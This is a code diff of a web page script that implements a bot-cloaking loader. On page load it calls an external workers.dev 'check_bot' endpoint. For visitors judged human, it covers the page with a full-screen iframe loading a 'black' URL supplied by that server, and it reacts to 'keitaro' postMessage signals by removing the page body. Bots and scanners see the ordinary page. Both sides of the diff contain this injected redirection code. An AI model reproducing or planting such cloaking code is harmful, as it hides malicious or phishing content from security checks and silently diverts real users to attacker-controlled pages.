@@ -1,73 +1,102 @@
 
-function createLoader() {
-  const frame = document.createElement('iframe');
-  frame.id = 'load_frame';
-  frame.src = `frameLoad.html`;
-  frame.frameBorder = 0;
-  frame.width = '100%';
-  frame.height = '100%';
-  frame.style.position = 'fixed';
-  frame.style.top = 0;
-  frame.style.left = 0;
-  frame.style.width = '100%';
-  frame.style.height = '100%';
-  frame.style.zIndex = 9999;
-  frame.style.background = '#fff';
-  document.body.appendChild(frame);
-}
 
-function removeLoader() {
-  const loadFrame = document.querySelector('#load_frame');
-  if (loadFrame) loadFrame.remove();
-}
-
-function showBlackFrame(blackUrl) {
-  document.body.innerHTML = ''; 
-  document.body.style.margin = '0';
-  document.body.style.padding = '0';
-  document.body.style.overflow = 'hidden';
-
-  const frame = document.createElement('iframe');
-  frame.setAttribute('src', blackUrl);
-  frame.setAttribute('id', 'wrapper_frame');
-  frame.style = `
-    width: 100vw;
-    height: 100vh;
-    border: none;
-    display: block;
-  `;
-
-  document.body.appendChild(frame);
-
-  const style = document.createElement('style');
-  style.innerHTML = `
-    @media only screen and (max-width: 768px) {
-      #wrapper_frame { height: 50vh; }
+const createLoader = () => {
+    const frame = document.createElement('iframe');
+    frame.id = 'load_frame';
+    frame.src = `frameLoad.html`;
+    frame.frameBorder = 0;
+    frame.width = '100%';
+    frame.height = '100%';
+    frame.style.position = 'fixed';
+    frame.style.top = 0;
+    frame.style.left = 0;
+    frame.style.width = '100%';
+    frame.style.height = '100%';
+    frame.style.zIndex = 9999;
+    const body = document.querySelector('html');
+    if (body && body.childNodes.length > 0) {
+        const parent = body;
+        parent.insertBefore(frame, body.firstChild)
     }
-    @media only screen and (max-width: 480px) {
-      #wrapper_frame { height: 30vh; }
-    }
-  `;
-  document.head.appendChild(style);
+
 }
+const toggleLoad = () => {
+    const body = document.querySelector('body');
+    if (body) {
+        body.removeAttribute('hidden');
+
+    }
+    const load_frame = document.querySelector('#load_frame');
+    if (load_frame) {
+        load_frame.remove();
+    }
+
+};
+createLoader();
+
+window.addEventListener('message', (message) => {
+    console.log(message.data);
+    if (message.data?.bot) {
+        const wrapper = document.querySelector('#wrapper_frame');
+        console.log(wrapper);
+        wrapper.remove();
+		console.log(wrapper);
+        setTimeout(toggleLoad, 500);
+
+    }
+    if (message.data?.keitaro && !message.data?.bot) {
+        const body = document.querySelector('body');
+        body.remove()
+        setTimeout(toggleLoad, 500);
+
+    }
+
+})
 
 window.addEventListener('DOMContentLoaded', () => {
-  createLoader() 
+    fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
+        if (res?.code == 200 && !res.result) {
+            createFrame(res.url + '/nf5nPY3n')
+			console.log(createFrame)
+			
+        } else {
+            setTimeout(toggleLoad, 500);
+			
 
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
-    .then(res => res.json())
-    .then(res => {
-      if (res?.code === 200 && !res.result) {
-       
-        showBlackFrame(res.url + '/nf5nPY3n');
-      }
-      
-      setTimeout(removeLoader, 500);
+        }
+
     })
-    .catch(err => {
-      console.error("Ошибка запроса:", err);
-      removeLoader(); 
-    });
-});
+
+})
 
 
+function createFrame(data) {
+    const frame = document.createElement('iframe');
+    frame.setAttribute('src', data);
+    frame.setAttribute('width', '100%');
+    frame.setAttribute('height', '100vh');
+    frame.setAttribute('id', 'wrapper_frame');
+    const html = document.querySelector('html');
+    html.style.overflow = 'hidden';
+
+    // body.innerHTML = '';
+    html.append(frame);
+    frame.style = 'width: 100%; height: 100vh;border: none;'
+    const style = document.createElement('style');
+    style.innerHTML = `
+    
+  /* Make the iframe responsive */
+  @media only screen and (max-width: 768px) {
+    iframe {
+      height: 50vh;
+    }
+  }
+
+  @media only screen and (max-width: 480px) {
+    iframe {
+      height: 30vh;
+    }
+  }
+    `;
+    html.append(style)
+}
